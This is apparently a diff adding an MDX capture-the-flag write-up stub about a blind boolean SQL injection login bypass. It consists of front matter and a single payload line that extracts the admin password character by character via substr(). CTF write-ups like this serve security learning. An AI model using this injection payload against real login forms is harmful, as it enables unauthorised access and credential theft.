@@ -1,0 +1,18 @@
+---
+
+
+## src/content/writeups/example-ctf.mdx
+```mdx
+---
+title: "CTF — SQLi Login Bypass"
+date: 2025-08-20
+summary: "Blind boolean SQLi to extract admin password via substring()."
+platform: CTF
+difficulty: Medium
+tags: [web, sqli, blind]
+---
+
+
+### Payload core
+```sql
+' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='a'-- -
